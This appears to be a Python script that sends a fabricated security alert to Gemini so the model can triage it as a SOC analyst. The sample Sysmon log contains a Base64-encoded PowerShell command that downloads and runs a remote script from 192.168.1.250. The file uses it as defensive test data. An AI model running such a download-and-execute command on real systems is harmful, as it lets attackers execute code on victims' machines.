import os
import json
from google import genai
from google.genai import types

# 1. Paste the enriched alert data from Step 1 & 2
alert_scenario_1 = {
    "alert_metadata": {
        "alert_id": "ALERT-2026-0042",
        "timestamp": "2026-07-04T21:12:05Z",
        "alert_title": "Suspicious PowerShell Execution - Obfuscated Command",
        "source": "Microsoft-Windows-Sysmon",
        "severity": "High"
    },
    "entities": {
        "user": "jdoe_admin",
        "device_host": "WKSTN-FIN-09",
        "source_ip": "10.0.4.152",
        "domain": "CORP.INTERNAL"
    },
    "raw_logs": [
        {
            "EventID": 1,
            "ProviderName": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-07-04T21:12:04Z",
            "ProcessId": 8432,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SUVYICgKTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5Mi4xNjguMS4yNTAvcGF5bG9hZC5wczEnKQ==",
            "ParentImage": "C:\\Windows\\system32\\cmd.exe",
            "ParentCommandLine": "\"cmd.exe\" /c \"C:\\Users\\jdoe_admin\\AppData\\Local\\Temp\\update.bat\"",
            "User": "CORP\\jdoe_admin"
        },
        {
            "EventID": 3,
            "ProviderName": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-07-04T21:12:06Z",
            "ProcessId": 8432,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "User": "CORP\\jdoe_admin",
            "Protocol": "tcp",
            "Initiated": "true",
            "SourceIp": "10.0.4.152",
            "SourcePort": 49211,
            "DestinationIp": "192.168.1.250",
            "DestinationPort": 80
        }
    ],
    "analyst_context": {
        "geolocation": "Internal Network (VLAN 4 - Finance)",
        "recent_activity": "User account 'jdoe_admin' logged into this workstation 15 minutes prior via RDP from a staging jump box.",
        "what_looks_suspicious": "PowerShell execution includes flags to hide the window (`-W Hidden`), ignore profiles (`-NoP`), and executes a heavily Base64 encoded payload (`-Enc`). Sysmon Event ID 3 immediately confirms a network connection to an external/untracked IP address right after the process spawned."
    }
}

# 2. Initialize the Gemini Client
# Make sure you have set your API key in your terminal: export GEMINI_API_KEY="your-key"
client = genai.Client()

# 3. Construct the Structured Triage Prompt (Following image_ab45ee.png)
system_instruction = """
You are an expert AI Detection Engineer and Tier 3 SOC Analyst. 
Your task is to analyze an incoming security alert along with its associated raw logs and context.

You must provide a structured report addressing the following sections exactly:
1. EXECUTIVE SUMMARY: Explain what happened in plain, clear language. Decode any obfuscated values (like Base64 strings) if present.
2. LIKELY ATTACK HYPOTHESIS: Detail the attacker's intent, objective, and current stage in the intrusion lifecycle.
3. MITRE ATT&CK MAPPING: Map the activity to the specific Tactic and Technique name + ID.
4. CONFIDENCE LEVEL: Provide a confidence assessment (Low, Medium, High) with a brief justification.
5. RECOMMENDED NEXT STEPS: Suggest immediate response tasks for an analyst.
6. DETECTION RULE LOGIC: Suggest a draft logic/structure for a Sigma or KQL rule to catch this behavior while avoiding false positives.
"""

user_content = f"""
Please triage the following enriched alert package:

{json.dumps(alert_scenario_1, indent=2)}
"""

print("[*] Sending enriched alert data to Gemini AI Agent...")

# 4. Execute the AI Triage
response = client.models.generate_content(
    model='gemini-2.5-flash',
    contents=user_content,
    config=types.GenerateContentConfig(
        system_instruction=system_instruction,
        temperature=0.2, # Low temperature for analytical consistency
    )
)

# 5. Display the Triage Report
print("\n=== AI DETECTION ENGINEER TRIAGE REPORT ===\n")
print(response.text)
input("\nPress Enter to exit...")